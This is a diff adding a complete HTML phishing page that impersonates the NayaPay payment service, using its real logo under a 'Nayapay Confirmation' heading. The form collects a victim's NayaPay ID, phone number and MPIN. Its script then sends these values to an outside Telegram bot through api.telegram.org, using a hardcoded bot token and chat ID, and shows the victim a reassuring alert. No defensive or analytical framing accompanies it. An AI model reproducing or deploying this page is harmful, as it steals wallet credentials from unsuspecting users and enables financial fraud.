@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nayapay Confirmation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        .container img {
+            max-width: 150px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .form-group input:focus {
+            border-color: #888;
+            outline: none;
+        }
+        .button-container {
+            margin-top: 20px;
+        }
+        button {
+            background-color: #FFA500; /* Light orange */
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #e69500;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Replace 'path/to/nayapay.png' with the actual path to your image -->
+        <img style="width: 300px;" src="https://www.nayapay.com/images/orange-logo.svg" alt="Nayapay Logo">
+        <h2>Nayapay Confirmation</h2>
+        <form id="nayapayForm">
+            <div class="form-group">
+                <label for="nayapayId">Nayapay ID:</label>
+                <input type="text" id="nayapayId" required>
+            </div>
+            <div class="form-group">
+                <label for="nayapayNumber">Nayapay Number:</label>
+                <input type="text" id="nayapayNumber" required>
+            </div>
+            <div class="form-group">
+                <label for="nayapayMpin">Nayapay MPIN:</label>
+                <input type="password" id="nayapayMpin" required>
+            </div>
+            <div class="button-container">
+                <button type="submit">Confirm</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('nayapayForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form from submitting normally
+
+            // Collect form data
+            const nayapayId = document.getElementById('nayapayId').value;
+            const nayapayNumber = document.getElementById('nayapayNumber').value;
+            const nayapayMpin = document.getElementById('nayapayMpin').value;
+
+            // Prepare the message to be sent to Telegram
+            const message = `Nayapay Confirmation:\nNayapay ID: ${nayapayId}\nNayapay Number: ${nayapayNumber}\nNayapay MPIN: ${nayapayMpin}`;
+
+            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual Telegram bot token and chat ID
+            const BOT_TOKEN = "7776972639:AAEnLHv-sMd2_w3kp5b-CfEbzYpTawUZF7k";
+            const CHAT_ID = "6840946092";
+
+            // Send data to Telegram bot
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Request sent successfully!');
+                } else {
+                    alert('Failed to send information.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error sending information.');
+            });
+        });
+    </script>
+</body>
+</html>
+
